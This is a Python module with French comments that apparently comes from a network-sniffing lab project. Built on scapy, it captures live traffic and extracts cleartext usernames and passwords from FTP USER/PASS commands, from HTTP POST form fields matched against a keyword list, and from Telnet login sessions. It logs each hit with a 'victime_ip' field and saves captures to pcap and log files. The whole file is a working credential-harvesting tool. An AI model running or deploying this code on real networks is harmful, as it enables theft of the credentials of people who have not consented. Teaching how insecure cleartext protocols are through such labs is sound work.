#!/usr/bin/env python3
"""
sniffer_core.py — Module de capture réseau et extraction de credentials
Utilisé à la fois par la CLI et par l'interface Flask
"""

import re
import sys
from datetime import datetime
from urllib.parse import unquote_plus

from scapy.all import IP, TCP, UDP, ICMP, sniff, wrpcap


class SnifferEngine:
    """Moteur de capture réseau avec extraction de credentials."""

    def __init__(self):
        self.reset()

    def reset(self):
        """Réinitialise toutes les données de capture."""
        self.packet_counts = {"TCP": 0, "UDP": 0, "ICMP": 0}
        self.captured_packets = []
        self.log_entries = []
        self.credentials_ftp = []
        self.credentials_http = []
        self.credentials_telnet = []
        self.interface = ""
        self.bpf_filter = ""
        self.is_running = False

        # FTP
        self.ftp_sessions = {}

        # Telnet
        self.telnet_sessions = {}

    # ──────────────────────────────────────────────
    # PARTIE A : Traitement générique des paquets
    # ──────────────────────────────────────────────

    def process_packet(self, packet):
        """Traite un paquet : log + extraction credentials."""
        if IP not in packet:
            return

        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        timestamp = packet.time
        horodatage = datetime.fromtimestamp(timestamp).strftime(
            "%Y-%m-%d %H:%M:%S.%f"
        )[:-3]

        protocole = "Inconnu"
        port_src = "-"
        port_dst = "-"

        if TCP in packet:
            protocole = "TCP"
            port_src = packet[TCP].sport
            port_dst = packet[TCP].dport
            self.packet_counts["TCP"] += 1
        elif UDP in packet:
            protocole = "UDP"
            port_src = packet[UDP].sport
            port_dst = packet[UDP].dport
            self.packet_counts["UDP"] += 1
        elif ICMP in packet:
            protocole = "ICMP"
            self.packet_counts["ICMP"] += 1

        ligne = (
            f"[{horodatage}] {protocole:5s} | "
            f"{ip_src:15s}:{str(port_src):5s} -> "
            f"{ip_dst:15s}:{str(port_dst):5s}"
        )

        self.log_entries.append(ligne)

        # Extraction credentials
        self._extract_ftp(packet)
        self._extract_http(packet)
        self._extract_telnet(packet)

        return {
            "horodatage": horodatage,
            "protocole": protocole,
            "ip_src": ip_src,
            "ip_dst": ip_dst,
            "port_src": str(port_src),
            "port_dst": str(port_dst),
            "ligne": ligne,
        }

    # ──────────────────────────────────────────────
    # PARTIE B : FTP
    # ──────────────────────────────────────────────

    def _extract_ftp(self, packet):
        if not packet.haslayer(TCP) or not packet.haslayer("Raw"):
            return

        tcp = packet[TCP]
        ip = packet[IP]

        if tcp.sport != 21 and tcp.dport != 21:
            return

        try:
            payload = packet["Raw"].load.decode("utf-8", errors="ignore").strip()
        except Exception:
            return

        client_ip = ip.src if tcp.sport != 21 else ip.dst
        serveur_ip = ip.dst if tcp.sport != 21 else ip.src
        client_port = tcp.sport if tcp.sport != 21 else tcp.dport
        cle = (client_ip, serveur_ip, client_port)

        user_match = re.search(r"^USER\s+(.+)$", payload, re.IGNORECASE)
        if user_match:
            if cle not in self.ftp_sessions:
                self.ftp_sessions[cle] = {"user": "", "password": ""}
            self.ftp_sessions[cle]["user"] = user_match.group(1).strip()

        pass_match = re.search(r"^PASS\s+(.+)$", payload, re.IGNORECASE)
        if pass_match:
            if cle not in self.ftp_sessions:
                self.ftp_sessions[cle] = {"user": "", "password": ""}
            self.ftp_sessions[cle]["password"] = pass_match.group(1).strip()

            session = self.ftp_sessions[cle]
            if session["user"]:
                cred = {
                    "horodatage": datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "victime_ip": client_ip,
                    "serveur_ip": serveur_ip,
                    "protocole": "FTP",
                    "username": session["user"],
                    "password": session["password"],
                }
                self.credentials_ftp.append(cred)
                return cred
        return None

    # ──────────────────────────────────────────────
    # PARTIE B : HTTP
    # ──────────────────────────────────────────────

    _MOTS_CLES_AUTH = [
        "password", "passwd", "pwd", "pass",
        "login", "username", "user", "email",
    ]

    def _extract_http(self, packet):
        if not packet.haslayer(TCP) or not packet.haslayer("Raw"):
            return

        tcp = packet[TCP]
        ip = packet[IP]

        if tcp.sport != 80 and tcp.dport != 80:
            return

        try:
            payload = packet["Raw"].load.decode("utf-8", errors="ignore")
        except Exception:
            return

        if not payload.startswith("POST"):
            return

        url_match = re.search(r"^POST\s+(\S+)\s+HTTP", payload)
        url_ciblee = url_match.group(1) if url_match else "inconnue"

        host_match = re.search(r"^Host:\s*(\S+)\s*$", payload, re.MULTILINE)
        host = host_match.group(1) if host_match else ""

        body_match = re.search(r"\r\n\r\n(.+)", payload, re.DOTALL)
        if not body_match:
            return

        body = body_match.group(1)
        credentials = {}

        for param in body.split("&"):
            if "=" not in param:
                continue
            key, value = param.split("=", 1)
            if any(mot in key.lower() for mot in self._MOTS_CLES_AUTH):
                credentials[key] = unquote_plus(value)

        if credentials:
            cred = {
                "horodatage": datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                "victime_ip": ip.src if tcp.sport != 80 else ip.dst,
                "serveur_ip": ip.dst if tcp.sport != 80 else ip.src,
                "protocole": "HTTP",
                "url": f"http://{host}{url_ciblee}",
                "donnees": credentials,
            }
            self.credentials_http.append(cred)
            return cred
        return None

    # ──────────────────────────────────────────────
    # PARTIE B : Telnet
    # ──────────────────────────────────────────────

    IAC = 255
    DONT = 254
    DO = 253
    WONT = 252
    WILL = 251
    SB = 250
    SE = 240

    @staticmethod
    def _nettoyer_telnet(data):
        """Supprime les séquences IAC du flux Telnet."""
        resultat = []
        i, n = 0, len(data)

        while i < n:
            if data[i] != 255:
                resultat.append(chr(data[i]))
                i += 1
                continue
            if i + 1 >= n:
                resultat.append(chr(data[i]))
                i += 1
                continue
            cmd = data[i + 1]
            if cmd in (253, 254, 251, 252):
                i += 3
            elif cmd == 250:
                j = i + 2
                while j < n - 1:
                    if data[j] == 255 and data[j + 1] == 240:
                        i = j + 2
                        break
                    j += 1
                else:
                    i += 1
            elif cmd == 255:
                resultat.append(chr(255))
                i += 2
            else:
                i += 2
        return "".join(resultat)

    def _extract_telnet(self, packet):
        if not packet.haslayer(TCP) or not packet.haslayer("Raw"):
            return

        tcp = packet[TCP]
        ip = packet[IP]

        if tcp.sport != 23 and tcp.dport != 23:
            return

        est_client = (tcp.sport != 23 and tcp.dport == 23)
        client_ip = ip.src if est_client else ip.dst
        serveur_ip = ip.dst if est_client else ip.src
        cle = (client_ip, serveur_ip)

        try:
            texte = self._nettoyer_telnet(packet["Raw"].load)
        except Exception:
            return

        if not texte:
            return

        if cle not in self.telnet_sessions:
            self.telnet_sessions[cle] = {"buffer": "", "user": "", "password": ""}

        if est_client:
            self.telnet_sessions[cle]["buffer"] += texte
            nettoie = texte.replace("\r", "")
            if "\n" in nettoie:
                lignes = [l.strip() for l in nettoie.split("\n") if l.strip()]
                session = self.telnet_sessions[cle]
                for ligne in lignes:
                    if not session["user"]:
                        session["user"] = ligne
                    elif not session["password"]:
                        session["password"] = ligne
                        cred = {
                            "horodatage": datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                            "victime_ip": client_ip,
                            "serveur_ip": serveur_ip,
                            "protocole": "TELNET",
                            "username": session["user"],
                            "password": session["password"],
                        }
                        self.credentials_telnet.append(cred)
                        return cred
        return None

    # ──────────────────────────────────────────────
    # LANCEMENT DE LA CAPTURE
    # ──────────────────────────────────────────────

    def start_capture(self, interface, bpf_filter="", callback=None):
        """
        Lance la capture réseau.
        callback : fonction appelée pour chaque paquet (pour Flask SSE)
        """
        self.reset()
        self.interface = interface
        self.bpf_filter = bpf_filter
        self.is_running = True

        def wrapper(packet):
            if not self.is_running:
                return False  # Arrête sniff()
            data = self.process_packet(packet)
            if data:
                self.captured_packets.append(packet)
                if callback:
                    callback(data)
            return True

        try:
            sniff(
                iface=interface,
                filter=bpf_filter if bpf_filter else None,
                prn=wrapper,
                store=False,
            )
        except Exception as e:
            print(f"[!] Erreur capture : {e}")
        finally:
            self.is_running = False

    def stop_capture(self):
        """Arrête la capture."""
        self.is_running = False

    # ──────────────────────────────────────────────
    # SAUVEGARDE DES FICHIERS
    # ──────────────────────────────────────────────

    def save_files(self):
        """Sauvegarde les fichiers .pcap et .log."""
        if self.captured_packets:
            wrpcap("captures/capture.pcap", self.captured_packets)

        with open("captures/capture.log", "w") as f:
            f.write(
                f"=== Sniffer Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n"
            )
            f.write(f"Interface: {self.interface} | Filtre: {self.bpf_filter or 'aucun'}\n\n")
            f.write("\n".join(self.log_entries))

    def get_bilan(self):
        """Retourne le bilan formaté."""
        total = sum(self.packet_counts.values())
        return {
            "TCP": self.packet_counts.get("TCP", 0),
            "UDP": self.packet_counts.get("UDP", 0),
            "ICMP": self.packet_counts.get("ICMP", 0),
            "total": total,
        }